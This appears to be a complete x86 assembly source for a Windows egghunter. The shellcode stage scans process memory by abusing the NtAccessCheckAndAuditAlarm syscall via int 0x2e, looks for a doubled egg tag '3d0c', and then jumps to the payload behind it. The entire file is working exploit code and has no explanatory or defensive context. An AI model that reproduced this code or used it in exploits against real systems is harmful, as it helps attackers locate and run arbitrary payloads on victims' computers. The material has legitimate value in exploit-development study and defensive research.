
global _start

section .text
_start:
    or dx, 0xfff        ; 4095  - paging?

_main:
    inc edx
    push edx
    push 0x2        ; NtAccessCheckAndAuditAlarm
    pop eax     
    int 0x2e        ; windows function to enter kernel mode
    cmp al, 0x5
    pop edx
    je _start; je  0x1  ; jmp _start

    mov eax, 0x33643063         ; egg  - "3d0c"
    mov edi, edx
    scas eax, DWORD PTR es:[edi]
    jne _main  ; jne 0x6  ; jmp _jmp2
    scas eax, DWORD PTR es:[edi]
    jne _main ;  jne 0x6  ; jmp _jmp2
    jmp edi